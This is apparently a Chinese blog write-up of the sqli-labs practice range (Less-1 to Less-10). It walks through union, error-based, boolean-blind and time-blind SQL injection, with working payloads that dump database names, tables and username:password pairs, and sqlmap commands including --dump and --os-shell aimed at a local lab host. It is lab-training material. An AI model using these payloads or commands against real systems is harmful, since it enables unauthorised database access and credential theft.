---
title: SQLi-Labs
date: 2026-08-21 15:48:15
cover: https://img.jasmine-iris.top/posts/SQLi-Labs/cover.webp
categories:
  - Web安全
  - SQL
tags:
  - SQL注入
  - 靶场
description: sqli-labs（Less-1 ~ Less-10）靶场 SQL 注入练习：联合注入、报错注入、布尔盲注、时间盲注四种注入方式的判断与利用，以及 sqlmap 的使用
---
> 靶场搭建：[https://blog.csdn.net/2302_82189125/article/details/136015200](https://blog.csdn.net/2302_82189125/article/details/136015200)
>

判断是否存在注入 --> 判断用哪种注入 --> 爆库→表→字段→数据

| 页面信号 | 注入类型 | 详细解释 |
| --- | --- | --- |
| 页面**回显查询结果** | 联合注入 union‑select | 页面会打印出数据库查询出来的数据。优先首选，速度最快；前提：有可利用的回显位，且前后查询列数一致。 |
| 页面**爆出 MySQL 原生报错信息** | 报错注入 updatexml /floor | 网站开启了错误回显，数据库报错内容打印在网页上；利用函数构造非法语句，**把想要的数据带出到报错信息**。 |
| 没有数据、没有报错；页面只有两种状态：**正常页面 / 异常页面** | 布尔盲注 | 根据页面返回真假二选一的页面，猜字符；核心函数：`substr()`<br/>、`ascii()`<br/>，一条一条猜。 |
| **真假完全看不出区别，页面一模一样，只有响应速度不一样** | 时间盲注（延时注入） | 用`sleep()`<br/>、`benchmark()`<br/>制造延时，靠**页面加载快慢**判断条件真假；最慢，最后才用的兜底方案。 |


```plain
加单引号'
    ↓
页面报错? → 是 → 报错注入
    ↓否
有查询数据回显？ → 是 → union联合注入
    ↓否
真假条件页面不一样？ → 是 → 布尔盲注
    ↓否
啥区别都没有 → 时间盲注
```

# 一、Basic Challenges
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298317150_jsc6o5.webp)

## 1.1 Less-1
### 1.1.1 联合注入（union select）
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298319587_xjko25.webp)

?id=1 页面正常

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298321311_jk70zi.webp)

#### 1. 判断是否存在注入
```sql
?id=1'
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298322844_d4a5ec.webp)

报错，返回`''1'' LIMIT 0,1'`。根据 `'1''`，说明存在单引号字符型注入

---

#### 2. 验证闭合方式
注释符注释后面的 SQL 代码

```sql
?id=1'--+
```

`-- `是 SQL 的注释符，但是在 url 中空格会丢失，所以一般写成`--+`

URL 编码规则：`+` 在查询参数里 **自动解码变成空格**

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298324659_lkfc97.webp)

 访问页面不再报错，证明单引号闭合有效。  

---

#### 3. order by 查询字段数
`order by N` N 超出实际字段数量时页面报错。

```sql
?id=1' order by 2--+
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298326360_gp8461.webp)

...

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298327961_klxukp.webp)

页面报错，说明一共有 3 个字段

---

#### 4. union 查找回显位
```sql
?id=-1' union select 1,2,3--+
```

注意这里使用 `-1` 或者其他数据库一定不存在的 id， 查询不到任何数据，页面只展示 union 后面我们自己写的查询结果。  

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298329379_zqyms2.webp)

 第 2、第 3 字段可以在页面回显数据，后续查询数据库信息使用这两个点位。  

---

#### 5. 查找当前数据库名
```sql
?id=-1' union select 1,database(),3--+
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298331357_hriada.webp)

得到数据库名是：security

---

#### 6. 查找security 库中的所有表名
```sql
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298333004_d3ygp8.webp)

 获取数据表：`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">emails,referers,uagents,users</font>`

---

#### 7. 查找 users 中的所有字段名
```sql
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' -- +
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298334695_pu1yyk.webp)

 获取字段：`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">id,username,password</font>`

---

#### 8. 查找数据
```sql
?id=-1' union select 1,group_concat(username,':',password,'<br>'),3 from users -- +
```

这里我加上了'<br>'，方便对照查看账号和密码。

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298336015_ochian.webp)

---

### 1.1.2 报错注入
#### ① updatexml()--**xpath报错**
```sql
?id=1 and updatexml(1, concat(0x5e, (查询语句), 0x5e), 1)
```





```sql
?id=1' and updatexml(1, concat(0x5e, database(), 0x5e), 1)--+    // 爆数据库
?id=1' and updatexml(1, concat(0x5e, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 0x5e), 1)--+		// 爆表名
?id=1' and updatexml(1, concat(0x5e, (select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'), 0x5e), 1)--+		// 爆字段名
?id=1' and updatexml(1, concat(0x5e, (select concat(username,':',password) from users limit 0,1), 0x5e), 1)--+		// 爆数据
```

> 0x5e = ^ 分隔符；
>
> --+ = 注释掉后面的 LIMIT 0,1。
>

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298337817_75vxl9.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298339063_3305iq.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298340866_nd2zhl.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298342091_lik8zv.webp)

> limit 0,1 → 第 1 行 Dumb:Dumb
>
> limit 1,1 → 第 2 行 Angelina:I-kill-you
>
> limit 2,1 → 第 3 行 ...
>
> 因为`updatexml/extractvalue` 爆长数据用 `group_concat` 全拼起来超过 32 字符会被截断 → 用 `limit`或 `substr` 分段 都行
>
> <!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298343537_bsv7rk.webp)
>

---

#### ②extractvalue()--**xpath报错**
```sql
?id=1 and extractvalue(1, concat(0x5c, (查询语句), 0x5c))
```





```sql
?id=1' and extractvalue(1, concat(0x5e, database(), 0x5e))--+    // 爆数据库
?id=1' and extractvalue(1, concat(0x5e, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 0x5e))--+		// 爆表名
?id=1' and extractvalue(1, concat(0x5e, (select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'), 0x5e))--+		// 爆字段名
?id=1' and extractvalue(1, concat(0x5e, (select concat(username,':',password) from users limit 0,1), 0x5e))--+		// 爆数据
```

回显结果同上

---

#### ③ groupby重复键冲突
```sql
?id=1 and (select 1 from (select count(*),concat(0x5e,(目标查询语句),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)
```





```sql
?id=1' and (select 1 from (select count(*),concat(0x5e,database(),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)--+    // 爆数据库
?id=1' and (select 1 from (select count(*),concat(0x5e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)--+		// 爆表名
?id=1' and (select 1 from (select count(*),concat(0x5e,(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)--+		// 爆字段名
?id=1' and (select 1 from (select count(*),concat(0x5e,(select concat(username,':',password) from users limit 0,1),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)--+		// 爆数据
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298344923_xxkjld.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298346201_mj2d5j.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298347704_m8m4jm.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298349206_ygxwzb.webp)

> `group_concat` 等聚合函数 → 禁止，放进去直接报错
>
> 原理：当子查询出现在 group by 的字段里面，MySQL 优化器有一条规则：
>
> 位于 GROUP BY 上下文中的子查询，只允许返回单行结果。一旦子查询查出多条记录，立刻抛出：Subquery returns more than 1 row
>

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298350776_2q1ova.webp)

---

| 注入类型 | 可用版本 | 失效版本 |
| --- | --- | --- |
| floor(rand()) group by | MySQL 5.5 | 5.7 + 修复 |
| updatexml /extractvalue XPATH 报错 | 5.5‑5.7 | **8.0.12 + 修复** |


---

### 1.1.3 布尔盲注
#### 1. 判断是否存在注入
```plain
?id=1'
```

字符型注入

---

#### 2. 判断用哪种注入
```sql
?id=1' and 1=1--+
?id=1' and 1=2--+
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298352089_f5did0.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298353605_it3rdj.webp)

正常/异常，存在布尔盲注

---

#### 3. 爆数据--一次测一个字符，用二分法逼近
```sql
ascii(substr( (子查询), 第几个字符, 1 )) > N
```

 修改位置，爆破第 n 位：

```sql
?id=1' and ascii(substr(database(),1,1))>114--+		//第1位
?id=1' and ascii(substr(database(),2,1))>114--+		//第2位
```

> 真右移 low+1 
>
> 假左移 high=mid  
>
> A‑Z：65‑90，a‑z：97‑122
>



```sql
?id=1' and ascii(substr(database(),1,1))>114--+				// 猜库名
?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))>114--+				// 猜表名
?id=1' and ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1))>114--+				// 猜库名
?id=1' and ascii(substr((select(group_concat(username,':',password)) from security.users limit 0,1),1,1))>114--+				// 猜数据
```

---

### 1.1.4 时间盲注
页面连正常/异常都分不出来，只有快慢--if(条件, 正常,sleep(5))，猜对了秒回，猜错了干等 5 秒。

```sql
?id=1' and if(ascii(substr(database(),1,1))>114,1,sleep(5))--+			// 猜库名
?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))>114--+				// 猜表名
?id=1' and ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1))>114--+				// 猜库名
?id=1' and ascii(substr((select(group_concat(username,':',password)) from security.users limit 0,1),1,1))>114--+				// 猜数据
```

---

### 1.1.5 sqlmap
核心参数

```sql
#基础扫描
-u "url"                     # 指定GET目标地址
--batch                      # 自动选择默认，跳过交互
-p id                        # 只检测id参数
--dbms mysql                 # 指定数据库为mysql
--technique=U/E/B/T         # 限定注入类型 U联合 E报错 B布尔 T时间盲注
--level 3                    # 扫描等级

#库查询
--dbs                        # 列出全部数据库
--current-db                 # 获取当前数据库
--users                      # 查询数据库用户
--current-user               # 查询当前数据库用户

#表、字段查询
-D security --tables         # 查询security库所有表
-D security -T users --columns  # 查询users表所有字段
-D security -T users -C username,password --dump #导出指定字段数据

#POST请求
--data "uname=admin"         # 设置post提交参数
-r post.txt                  # 读取burp数据包文件
--cookie="xxx"               # 携带cookie

#高级功能
--hex                        # 十六进制导出，防止中文乱码
--sql-shell                  # 获取mysql查询shell
--os-shell                   # 获取系统shell
```

```sql
# 检测注入点
sqlmap -u "http://<目标>" --batch

# 1. 爆所有数据库
sqlmap -u "http://<目标>" --batch --dbms=mysql --dbs

# 2. 爆指定库的表
sqlmap -u "http://<目标>" --batch -D security --tables

# 3. 爆指定表的字段
sqlmap -u "http://<目标>" --batch -D security -T users --columns

# 4. 导出数据
sqlmap -u "http://<目标>" --batch -D security -T users -C
```



#### 1. 检测注入点
```bash
sqlmap -u "http://192.168.2.101:81/sql/sqli-labs-master/Less-1/?id=1" --batch
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298355022_d1arca.webp)

---

#### 2. 查当前数据库
```bash
sqlmap -u "http://192.168.2.101:81/sql/sqli-labs-master/Less-1/?id=1" --current-db --batch
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298356859_t893i2.webp)

`security`

#### 3. 查 security 库里面所有表
```bash
sqlmap -u "http://192.168.2.101:81/sql/sqli-labs-master/Less-1/?id=1" -D security --tables --batch
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298358861_kgkcon.webp)

表名：`emails,referers,uagents,users`

#### 4. 查 users 表里字段名
```bash
sqlmap -u "http://192.168.2.101:81/sql/sqli-labs-master/Less-1/?id=1" -D security -T users --columns --batch
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298360655_6mfxq4.webp)

得到字段：`id, username, password`

#### 5. 导出 username 和 password 的全部数据
```bash
sqlmap -u "http://192.168.2.101:81/sql/sqli-labs-master/Less-1/?id=1" -D security -T users -C username,password --dump --batch
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298362854_0xoxjk.webp)

---

### 1.1.6 POST注入（表单登录框，无url参数）
两种写法  
写法1：`--data`

```bash
sqlmap -u "http://xxx/Less‑11/" --data "uname=admin&passwd=123&submit=Submit" --batch
```

写法2：

1. burp抓到POST数据包，复制全部内容，新建文件`post.txt`保存
2. `-r`读取数据包文件

```bash
sqlmap -r post.txt --batch
```

---

## 1.2 Less-2
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298364550_n91j5x.webp)

```sql
?id=1
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298366242_pg3f9r.webp)

### 1.2.1 确认注入点
```sql
?id=1'
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298367984_xa53xy.webp)

### 1.2.2 验证闭合方式
报错，返回`' LIMIT 0,1`，说明存在数字型注入。

```sql
?id=1--+
```

---

## 1.3 Less-3
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298370245_ifub49.webp)

```sql
?id=1
```

### 1.3.1 确认注入点
```sql
?id=1'
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298371892_m6kki0.webp)

### 1.3.2 验证闭合方式
报错，`'1'') LIMIT 0,1`，说明是单引号+括号闭合字符型注入

验证闭合方式

```sql
?id=1')--+
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298373652_v1z2tv.webp)

 页面不再报错，确认闭合方式 `<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">')</font>` 正确。  

---

## 1.4 Less-4
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298375395_ztgx7f.webp)

### 1.4.1 确认注入点
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298377335_vjulk4.webp)

单引号无报错

```sql
?id=1"
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298379079_d8y62n.webp)

`"1"") LIMIT 0,1`，说明是双引号+括号的字符型注入

### 1.4.2 验证闭合方式
```sql
?id=1")--+
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298380691_a335zr.webp)

---

## 1.5 Less-5
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298382169_6gwfa8.webp)

```sql
?id=1
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298383847_7eokcx.webp)

### 1.5.1 确认注入点
```sql
?id=1'
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298385745_8j935h.webp)

`''1'' LIMIT 0,1` ，单引号字符型注入

### 1.5.2 验证闭合方式
```sql
?id=1'--+
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298387724_1nwus3.webp)

```sql
?id=1' order by 4 --+		//报错，说明字段数是3
?id=-1' union select 1,2,3 --+
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298389322_ylkl9n.webp)

没有回显，不能用联合注入❌

### 1.5.3 四种方法
#### ① 有报错，可以用报错注入✅


#### ② 有正常/异常信号，可以用布尔盲注✅
```sql
?id=1' and 1=1--+
?id=1' and 1=2--+
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298390878_eq6sou.webp)<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298392302_ae3kfq.webp)



#### ③ 存在时间延迟，可以用时间盲注✅
```sql
?id=1' and if(ascii(substr(database(),1,1))>110,1,sleep(5))--+
?id=1' and if(ascii(substr(database(),1,1))>115,1,sleep(5))--+
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298393793_yx5ofh.webp)<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298395128_tfq5d5.webp)



#### ④ sqlmap
```bash
sqlmap -u "http://192.168.2.101:81/sql/sqli-labs-master/Less-5/?id=1" --batch
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298396752_511y44.webp)

---

## 1.6 Less-6
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298398902_do2eh3.webp)

### 1.6.1 确认注入点
```sql
?id=1"
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298400969_wsa9q0.webp)

`'"1"" LIMIT 0,1'`，双引号注入

### 1.6.2 验证闭合方式
```sql
?id=1"--+
```

```sql
?id=1" order by 4 --+		//报错，说明字段数是3
?id=-1" union select 1,2,3 --+
```

没有回显，不能用联合注入❌

### 1.6.3 sqlmap 检索有哪些注入方式
```plain
sqlmap -u "http://192.168.2.101:81/sql/sqli-labs-master/Less-6/?id=1" --batch
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298403220_22y5dz.webp)

---

## 1.7 Less-7
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298405380_jraakw.webp)

```plain
?id=1'
```

单引号报错，只有 正常/异常 页面

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298407721_2zxia7.webp)

---

## 1.8 Less-8
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298409813_vl6w59.webp)

### 1.8.1 sqlmap
```plain
sqlmap -u "http://192.168.2.101:81/sql/sqli-labs-master/Less-8/?id=1" --batch
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298411340_oymxjc.webp)

---

## 1.9 Less-9
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298412936_z64acb.webp)

### 1.9.1 sqlmap
```plain
sqlmap -u "http://192.168.2.101:81/sql/sqli-labs-master/Less-9/?id=1" --batch
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298414118_kyh3sx.webp)

Less-7~9 都只能用盲注（布尔/时间），sqlmap 一把梭。

---

## 1.10 Less-10
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298415714_iv2w9j.webp)

### 1.10.1 手动测试
```plain
?id=1' and if(1=2,1,sleep(5))--+
?id=1" and if(1=2,1,sleep(5))--+
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298418091_8rn9bs.webp)<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298419848_gu8t44.webp)

说明`"`是闭合符

排除了：

联合注入----无回显

报错注入----加引号无报错

布尔盲注----`1=1/1=2 `页面一样

确定是双引号时间盲注----`sleep` 卡 5 秒

### 1.10.2 sqlmap
```plain
sqlmap -u "http://192.168.2.101:81/sql/sqli-labs-master/Less-10/?id=1" --batch
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298421191_6136qh.webp)

当目标只剩时间信号、且闭合符特殊时，工具不知道闭合符就测不出来。

`--technique=T`：sqlmap 默认会尝试所有技术：B(布尔盲注) 、E(报错) 、U(联合)、S(堆叠)、T(时间盲注)、Q(内联查询)

`--prefix='"'`：闭合符

`--time-sec=1`：时间信道的强度，默认是 5 秒(猜一个字符要发几十个请求，每个等 5 秒太慢）

```plain
sqlmap -u "http://192.168.2.101:81/sql/sqli-labs-master/Less-10/?id=1" --batch --technique=T  --prefix='"' --time-sec=1
```

+ 传双引号 → `--prefix='"'`（单引号包双引号）
+ 传单引号 → `--prefix="'"`（双引号包单引号）



验证注入方式：时间盲注

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQLi-Labs/1787298423595_f2ys7o.webp)

---

